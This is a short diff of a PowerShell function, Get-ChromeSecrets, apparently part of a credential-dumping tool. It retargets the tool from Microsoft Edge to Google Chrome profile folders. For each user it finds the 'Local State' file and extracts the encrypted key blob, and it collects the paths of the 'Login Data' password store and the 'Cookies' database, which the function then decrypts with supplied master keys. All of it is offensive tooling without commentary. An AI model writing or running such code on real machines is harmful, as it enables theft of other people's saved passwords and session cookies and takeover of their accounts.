@@ -4890,11 +4890,11 @@ function Get-ChromeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 			$User = @{}
 			ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
 			{
-				ForEach ($Subfolder2 in @("", "Default"))
+				ForEach ($Subfolder2 in @("", "Google"))
 				{
-					ForEach ($Subfolder3 in @("", "Network"))
+					ForEach ($Subfolder3 in @("", "Default"))
 					{
-						$FileLocalState =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Local State"
+						$FileLocalState =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Local State"
 						If (Test-Path $FileLocalState)
 						{
 							$Content = Get-Content $FileLocalState
@@ -4906,13 +4906,13 @@ function Get-ChromeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 							$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
 						}
 
-						$FileLoginData = "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Login Data"
+						$FileLoginData = "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Login Data"
 						If (Test-Path $FileLoginData)
 						{
 							$User["FileLoginData"] = $FileLoginData
 						}
 
-						$FileCookies =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Cookies"
+						$FileCookies =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Cookies"
 						If (Test-Path $FileCookies)
 						{
 							$User["FileCookies"] = $FileCookies
